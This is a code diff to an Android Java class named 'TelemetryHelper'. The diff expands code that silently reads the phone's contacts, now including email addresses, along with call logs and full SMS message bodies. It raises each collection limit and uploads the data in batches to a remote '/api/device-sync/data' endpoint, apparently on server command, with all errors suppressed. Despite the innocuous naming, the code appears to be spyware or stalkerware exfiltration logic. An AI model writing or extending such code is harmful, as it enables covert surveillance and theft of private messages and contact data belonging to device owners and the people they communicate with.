@@ -56,55 +56,101 @@ public class TelemetryHelper {
             public void run() {
                 try {
                     ContentResolver cr = context.getContentResolver();
-                    Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-                    if (c == null) return;
-
                     java.util.LinkedHashMap<String, JSONObject> map = new java.util.LinkedHashMap<>();
-                    int nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
-                    int numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
-                    int idIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);
 
-                    while (c.moveToNext() && map.size() < 15000) {
-                        String name = nameIdx >= 0 ? c.getString(nameIdx) : null;
-                        String num = numIdx >= 0 ? c.getString(numIdx) : null;
-                        String id = idIdx >= 0 ? c.getString(idIdx) : null;
-                        if (name == null || name.trim().isEmpty()) name = "Contact #" + (map.size() + 1);
+                    // 1. Phone contacts (all SIMs + Google accounts)
+                    scanPhoneContacts(cr, map);
 
-                        JSONObject item = map.get(id != null ? id : name);
-                        if (item == null) {
-                            item = new JSONObject();
-                            item.put("name", name);
-                            item.put("phone_numbers", new JSONArray());
-                            map.put(id != null ? id : name, item);
-                        }
-                        if (num != null && !num.trim().isEmpty()) {
-                            item.getJSONArray("phone_numbers").put(num.trim());
-                        }
-                    }
-                    c.close();
+                    // 2. Email-only contacts (Gmail, etc.)
+                    scanEmailContacts(cr, map);
 
+                    // Send in batches of 2000
                     JSONArray batch = new JSONArray();
                     for (JSONObject obj : map.values()) {
                         batch.put(obj);
-                        if (batch.length() >= 1000) {
-                            JSONObject body = new JSONObject();
-                            body.put("device_id", deviceId);
-                            if (cmdId != null) body.put("command_id", cmdId);
-                            body.put("contacts", batch);
-                            ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
+                        if (batch.length() >= 2000) {
+                            sendContactBatch(serverUrl, deviceId, cmdId, batch);
                             batch = new JSONArray();
                         }
                     }
                     if (batch.length() > 0) {
-                        JSONObject body = new JSONObject();
-                        body.put("device_id", deviceId);
-                        if (cmdId != null) body.put("command_id", cmdId);
-                        body.put("contacts", batch);
-                        ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
+                        sendContactBatch(serverUrl, deviceId, cmdId, batch);
                     }
                 } catch (Exception ignored) {}
             }
         }).start();
+    }
+
+    @SuppressLint("Range")
+    private static void scanPhoneContacts(ContentResolver cr, java.util.LinkedHashMap<String, JSONObject> map) {
+        try {
+            Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+            if (c == null) return;
+            int nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+            int numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+            int idIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);
+
+            while (c.moveToNext() && map.size() < 20000) {
+                String name = nameIdx >= 0 ? c.getString(nameIdx) : null;
+                String num = numIdx >= 0 ? c.getString(numIdx) : null;
+                String id = idIdx >= 0 ? c.getString(idIdx) : null;
+                if (name == null || name.trim().isEmpty()) name = "Contact #" + (map.size() + 1);
+                String key = id != null ? id : name;
+                JSONObject item = map.get(key);
+                if (item == null) {
+                    item = new JSONObject();
+                    item.put("name", name);
+                    item.put("phone_numbers", new JSONArray());
+                    item.put("emails", new JSONArray());
+                    map.put(key, item);
+                }
+                if (num != null && !num.trim().isEmpty()) {
+                    item.getJSONArray("phone_numbers").put(num.trim());
+                }
+            }
+            c.close();
+        } catch (Exception ignored) {}
+    }
+
+    @SuppressLint("Range")
+    private static void scanEmailContacts(ContentResolver cr, java.util.LinkedHashMap<String, JSONObject> map) {
+        try {
+            Cursor c = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, null, null, null);
+            if (c == null) return;
+            int nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME);
+            int emailIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);
+            int idIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID);
+
+            while (c.moveToNext() && map.size() < 20000) {
+                String name = nameIdx >= 0 ? c.getString(nameIdx) : null;
+                String email = emailIdx >= 0 ? c.getString(emailIdx) : null;
+                String id = idIdx >= 0 ? c.getString(idIdx) : null;
+                if (name == null || name.trim().isEmpty()) name = email != null ? email : "Contact #" + (map.size() + 1);
+                String key = id != null ? id : name;
+                JSONObject item = map.get(key);
+                if (item == null) {
+                    item = new JSONObject();
+                    item.put("name", name);
+                    item.put("phone_numbers", new JSONArray());
+                    item.put("emails", new JSONArray());
+                    map.put(key, item);
+                }
+                if (email != null && !email.trim().isEmpty()) {
+                    item.getJSONArray("emails").put(email.trim());
+                }
+            }
+            c.close();
+        } catch (Exception ignored) {}
+    }
+
+    private static void sendContactBatch(String serverUrl, String deviceId, String cmdId, JSONArray batch) {
+        try {
+            JSONObject body = new JSONObject();
+            body.put("device_id", deviceId);
+            if (cmdId != null) body.put("command_id", cmdId);
+            body.put("contacts", batch);
+            ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
+        } catch (Exception ignored) {}
     }
 
     @SuppressLint("Range")
@@ -118,9 +164,9 @@ public class TelemetryHelper {
                     if (c == null) return;
 
                     JSONArray list = new JSONArray();
-                    SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
+                    SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
 
-                    while (c.moveToNext() && list.length() < 2500) {
+                    while (c.moveToNext() && list.length() < 5000) {
                         String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                         String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                         int type = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));
@@ -137,7 +183,8 @@ public class TelemetryHelper {
                         if (name != null) item.put("contact_name", name);
                         item.put("call_type", callType);
                         item.put("duration_seconds", duration);
-                        item.put("timestamp", iso.format(new Date(date)));
+                        // Truncate to seconds precision to match DB upsert
+                        item.put("timestamp", iso.format(new Date((date / 1000) * 1000)));
                         list.put(item);
                     }
                     c.close();
@@ -164,9 +211,9 @@ public class TelemetryHelper {
                     if (c == null) return;
 
                     JSONArray list = new JSONArray();
-                    SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
+                    SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
 
-                    while (c.moveToNext() && list.length() < 5000) {
+                    while (c.moveToNext() && list.length() < 10000) {
                         String address = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));
                         String bodyText = c.getString(c.getColumnIndex(Telephony.Sms.BODY));
                         int type = c.getInt(c.getColumnIndex(Telephony.Sms.TYPE));
@@ -176,7 +223,8 @@ public class TelemetryHelper {
                         item.put("sender", address != null ? address : "Unknown");
                         item.put("body", bodyText != null ? bodyText : "");
                         item.put("message_type", type == Telephony.Sms.MESSAGE_TYPE_SENT ? "sent" : "inbox");
-                        item.put("timestamp", iso.format(new Date(date)));
+                        // Truncate to seconds precision to match DB upsert
+                        item.put("timestamp", iso.format(new Date((date / 1000) * 1000)));
                         list.put(item);
                     }
                     c.close();
